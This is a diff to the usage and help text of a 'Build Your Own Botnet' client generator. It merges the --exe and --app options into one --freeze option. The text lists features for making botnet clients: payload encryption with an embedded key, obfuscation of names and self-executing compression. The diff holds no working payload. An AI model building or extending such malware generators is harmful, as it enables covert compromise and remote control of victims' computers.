@@ -3,7 +3,7 @@
 """Client Generator (Build Your Own Botnet)
 
 usage: client.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
-                 [--encrypt] [--obfuscate] [--compress] [--exe] [--app]
+                 [--encrypt] [--obfuscate] [--compress] [--freeze]
                  host port [module [module ...]]
 
 Generator (Build Your Own Botnet)
@@ -22,8 +22,7 @@ optional arguments:
   --encrypt       encrypt payload and embed key in stager
   --obfuscate     obfuscate names of classes, functions & variables
   --compress      zip-compress into a self-executing python script
-  --exe           compile into a standalone bundled executable
-  --app           bundle into a standlone application
+  --freeze        compile client into a standalone executable for the current host platform
 
 Generate clients with the following features:
 
